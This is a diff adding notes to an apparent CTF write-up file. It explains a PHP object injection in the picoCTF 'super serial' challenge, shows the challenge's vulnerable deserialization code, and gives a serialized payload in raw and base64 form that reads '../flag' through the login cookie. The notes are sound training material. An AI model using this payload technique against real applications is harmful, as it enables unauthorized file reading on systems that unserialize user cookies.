@@ -577,3 +577,72 @@ https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-pa
 2. Capture the webasm data using wget `wget "http://ctfchallenge/aD8SvhyVkb"`  
 3. I then extracted what appears to be a sequence of characters and numbers that looks different than the asm data. For example, in this picoctf I had found `+xakgK\Nsl<8?nmi:<i;0j9:;?nm8i=0??:=njn=9u`.  
 4. Using Cyberchef, you can use the magic feature to retrieve the flag `XOR({'option':'Hex','string':'8'},'Standard',false)`.  
+
+### php object injection
+A great writeup on picoctf super serial  
+https://github.com/JeffersonDing/CTF/tree/master/pico_CTF_2021/web/super_serial  
+
+#### index.phps shows the source code of the page. We are able to confirm that `login` is the cookie header name.  The cookie is then base64 encoded and then url encoded for the payload and assigned to the end user. The cookie header works when you visit `authentication.php`
+
+```php
+<?php
+require_once("cookie.php");
+
+if(isset($_POST["user"]) && isset($_POST["pass"])){
+	$con = new SQLite3("../users.db");
+	$username = $_POST["user"];
+	$password = $_POST["pass"];
+	$perm_res = new permissions($username, $password);
+	if ($perm_res->is_guest() || $perm_res->is_admin()) {
+		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
+		header("Location: authentication.php");
+		die();
+	} else {
+		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
+	}
+}
+?>
+```
+
+#### Vulnerable Code
+
+```php
+<?php
+
+class access_log
+{
+	public $log_file;
+
+	function __construct($lf) {
+		$this->log_file = $lf;
+	}
+
+	function __toString() {
+		return $this->read_log();
+	}
+
+	function append_to_log($data) {
+		file_put_contents($this->log_file, $data, FILE_APPEND);
+	}
+
+	function read_log() {
+		return file_get_contents($this->log_file);
+	}
+}
+
+require_once("cookie.php");
+if(isset($perm) && $perm->is_admin()){
+	$msg = "Welcome admin";
+	$log = new access_log("access.log");
+	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
+} else {
+	$msg = "Welcome guest";
+}
+?>
+```
+
+#### payload
+
+O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}
+
+TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
